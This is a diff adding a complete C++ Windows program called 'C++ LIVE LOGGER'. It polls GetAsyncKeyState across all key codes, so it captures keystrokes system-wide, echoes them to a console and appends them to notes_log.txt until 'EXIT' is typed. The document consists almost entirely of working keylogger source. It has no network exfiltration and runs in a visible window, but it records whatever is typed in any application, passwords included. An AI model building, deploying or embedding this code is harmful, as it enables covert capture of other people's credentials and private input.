@@ -1,0 +1,92 @@
+#define _CRT_SECURE_NO_WARNINGS
+#include <iostream>
+#include <fstream>
+#include <windows.h>
+#include <winuser.h>
+#include <string>
+#include <ctime>
+using namespace std;
+
+void logKey(int key, ofstream& file) {
+    if (key == VK_SPACE) {
+        cout << " [SPACE] ";
+        file << " ";
+    }
+    else if (key == VK_RETURN) {
+        cout << "\n[ENTER]\n";
+        file << "\n";
+    }
+    else if (key == VK_BACK) {
+        cout << " [BACKSPACE] ";
+        file << "[BACKSPACE]";
+    }
+    else if (key == VK_SHIFT) {
+        cout << " [SHIFT] ";
+    }
+    else {
+        char c = (char)key;
+        cout << c;
+        file << c;
+    }
+    file.flush();
+}
+
+string getCurrentTime() {
+    time_t now = time(nullptr);
+    tm* localTime = localtime(&now);
+    char buf[80];
+    strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", localTime);
+    return string(buf);
+}
+
+int main() {
+    setlocale(LC_ALL, "Russian");
+
+    cout << "===================================================\n";
+    cout << "             C++ LIVE LOGGER                \n";
+    cout << "===================================================\n";
+    cout << "Для завершения работы - 'exit'\n";
+    cout << "===================================================\n\n";
+
+    ofstream outFile("notes_log.txt", ios::app);
+    if (!outFile.is_open()) {
+        cout << "Error:Log File Failed\n";
+        return 1;
+    }
+
+    string timeStr = getCurrentTime();
+    outFile << "\n--- Session Start: " << timeStr << " ---\n";
+
+    string exitTracker = "";
+
+    while (true) {
+        for (int key = 8; key <= 255; key++) {
+            if (GetAsyncKeyState(key) & 0x0001) {
+
+                logKey(key, outFile);
+
+                if (key >= 'A' && key <= 'Z') {
+                    exitTracker += (char)key;
+                }
+                else if (key == VK_SPACE || key == VK_RETURN) {
+                    exitTracker = "";
+                }
+
+                if (exitTracker.find("EXIT") != string::npos) {
+                    goto end_loop;
+                }
+            }
+        }
+        Sleep(10);
+    }
+
+    static_cast<void>(0);
+end_loop:
+
+    outFile << "\n--- Session End: " << timeStr << " ---\n";
+    outFile.close();
+
+    cout << "\n\nLog Saved\n";
+    system("pause");
+    return 0;
+}
